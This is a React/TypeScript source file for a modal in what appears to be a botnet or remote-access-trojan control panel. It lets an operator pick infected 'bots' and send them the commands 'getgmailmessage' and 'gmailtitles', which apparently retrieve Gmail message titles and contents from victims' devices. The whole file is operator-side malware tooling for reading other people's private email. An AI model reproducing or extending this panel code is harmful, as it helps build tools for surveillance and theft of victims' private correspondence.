import React from "react";
import {ModalWithSelectedBotsProps} from "../../../Model/Modal";
import {Button, Form, Input, Modal} from "antd";
import {getBotsId} from "../../../Util/getBotIds";
import sendCommand from "../../../Requests/Commands/sendCommands";
import {useTranslation} from "react-i18next";

const GetGmailMessages: React.FC<ModalWithSelectedBotsProps> = (props: ModalWithSelectedBotsProps) => {
    const [form] = Form.useForm();

    const closeModal = () => {
        props.setVisible(false);
        form.resetFields();
    };

    form.setFieldsValue({
        mes_num: 0,
    });

    const formSubmit = () => {
        sendCommand({
            command: "getgmailmessage",
            payload: {
                mes_num: form.getFieldValue("mes_num"),
            },
            botIds: getBotsId(props.selectedBots),
        });

        closeModal();
    };

    const {t} = useTranslation();

    return (
        <Modal
            title={(
                <>
                    <i className="fa-brands fa-google" /> {t("GET_GMAIL_MESSAGE")}
                </>
            )}
            open={props.visible}
            onCancel={closeModal}
            onOk={() => form.submit()}
            footer={(
                <>
                    <Button
                        type="default"
                        onClick={closeModal}
                    >
                        {t("MODAL_BUTTON_CANCEL")}
                    </Button>
                    <Button
                        type="primary"
                        onClick={() => {
                            sendCommand({
                                command: "gmailtitles",
                                payload: [],
                                botIds: getBotsId(props.selectedBots),
                            });

                            closeModal();
                        }}
                    >
                        {t("GMAIL_TITLES_COMMAND")}
                    </Button>
                    <Button
                        type="primary"
                        onClick={() => form.submit()}
                    >
                        {t("GET")}
                    </Button>
                </>
            )}
            width={380}
            destroyOnClose
        >
            <Form form={form} layout="vertical" onFinish={formSubmit}>
                <Form.Item label={t("MESSAGE_NUMBER")} name="mes_num">
                    <Input type={"number"} />
                </Form.Item>
            </Form>
        </Modal>
    );
};

export default GetGmailMessages;
